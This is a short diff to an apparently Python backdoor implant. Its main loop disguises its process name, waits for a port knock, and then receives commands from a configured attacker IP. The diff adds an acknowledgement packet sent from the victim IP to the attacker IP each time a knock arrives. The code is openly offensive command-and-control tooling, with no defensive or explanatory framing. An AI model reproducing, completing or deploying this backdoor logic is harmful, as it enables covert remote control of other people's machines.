@@ -137,6 +137,7 @@ def main():
     setproctitle(args.name)
 
     wait_for_knock()
+    send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
 
     while True:
         command = receive_data(from_ip=Cfg.ATTACKER_IP, timeout=360)
@@ -148,6 +149,7 @@ def main():
 
         if res == 'Attacker disconnected':
             wait_for_knock()
+            send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
 
 
 if __name__ == "__main__":
